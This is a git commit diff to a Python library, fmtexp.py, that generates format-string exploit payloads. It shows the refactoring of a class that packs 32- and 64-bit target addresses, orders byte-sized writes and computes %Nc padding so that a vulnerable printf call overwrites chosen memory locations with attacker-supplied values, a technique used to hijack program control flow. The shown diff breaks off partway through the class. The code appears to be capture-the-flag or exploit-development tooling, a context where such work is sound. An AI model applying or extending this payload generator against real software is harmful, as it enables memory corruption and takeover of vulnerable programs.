5caf0a70eca77a55a891df59729f3f4c6e14e63c
Naetw <wangzhelee.cs04@g2.nctu.edu.tw>
2017-02-12 19:24:36 +0800

    Finish 32 bits version

--- formatstring/fmtexp.py
+++ formatstring/fmtexp.py
@@ -2,42 +2,38 @@ import struct
 
 p32 = lambda x : struct.pack('<L', x)
 p64 = lambda x : struct.pack('<Q', x)
-get_byte = lambda x : (x[0], x[1] & 0xff)
 
-class FormatStringExploit:
+class FmtStrExp:
     printed = 0
     table = {
-            32 : [p32, 4],
-            64 : [p64, 6]
-            }
+        32 : [p32, 4],
+        64 : [p64, 6]
+    }
 
     def __init__(self, printed=0, hij_tar=None, hij_val=None):
         self.hijack_target = hij_tar
-        self.hijack_address = hij_val
-        FormatStringExploit.printed += printed
+        self.hijack_value = hij_val
+        FmtStrExp.printed += printed
         
-    def value_setup(self, size=4):
-        '''Arrange size of value per byte for optimization'''
-        val = [(self.hijack_target + i, self.hijack_address >> 8 * i) for i in xrange(size)]
-        return sorted(map(get_byte, val), key=lambda x : (x[1] - 16) & 0xff)
-
     @staticmethod
-    def sort_multi_target(val):
-        '''This is for hijack multiple target once'''
-        '''Sort it by the value we want to change, so that it will be more efficient'''
-        return sorted(val, key=lambda x : x[1])
+    def sort_multi_target(fmt_tuple, bits):
+        '''Arrange value per byte for optimization'''
+        final_fmt = []
+        for fmt in fmt_tuple:
+            final_fmt += [(fmt[0].hijack_target + i, (fmt[0].hijack_value >> 8 * i) & 0xff) for i in xrange(fmt[1])]
+        return sorted(final_fmt, key=lambda x : (x[1] - FmtStrExp.table[bits][1] * len(final_fmt)) & 0xff)
         
     @classmethod
-    def generate_target(cls, val, bits):
-        payload = ''.join(cls.table[bits][0](i[0]) for i in val)
-        cls.printed += cls.table[bits][1] * len(val)
+    def generate_target(cls, total_fmt, bits):
+        payload = ''.join(cls.table[bits][0](i[0]) for i in total_fmt)
+        cls.printed += cls.table[bits][1] * len(total_fmt)
         return payload
 
     @classmethod
-    def generate_fmt(cls, val, offset):
-        val = map(lambda x : x[1], val)
+    def generate_fmt(cls, total_fmt, offset):
+        total_fmt = map(lambda x : x[1], total_fmt)
         payload = ''
-        for idx, byte in enumerate(val):
+        for idx, byte in enumerate(total_fmt):
             pad = ((byte - cls.printed) % 256 + 256) % 256
             if pad > 0:
                 payload += "%{}c".format(pad)
@@ -45,11 +41,15 @@ class FormatStringExploit:
             cls.printed += pad
         return payload
 
-    def generate32(self, off):
-        '''For simplest usage of formatstring'''
-        val = self.value_setup()
-        payload = FormatStringExploit.generate_target(val, 32)
-        payload += FormatStringExploit.generate_fmt(val, off)
+    @classmethod
+    def generate32(cls, fmt_tuple, off):
+        
+        # Setup efficient order of hijack target
+        total_fmt = FmtStrExp.sort_multi_target(fmt_tuple, 32)
+
+        # Generate payload
+        payload = FmtStrExp.generate_target(total_fmt, 32)
+        payload += FmtStrExp.generate_fmt(total_fmt, off)
         return payload
 
     @classmethod
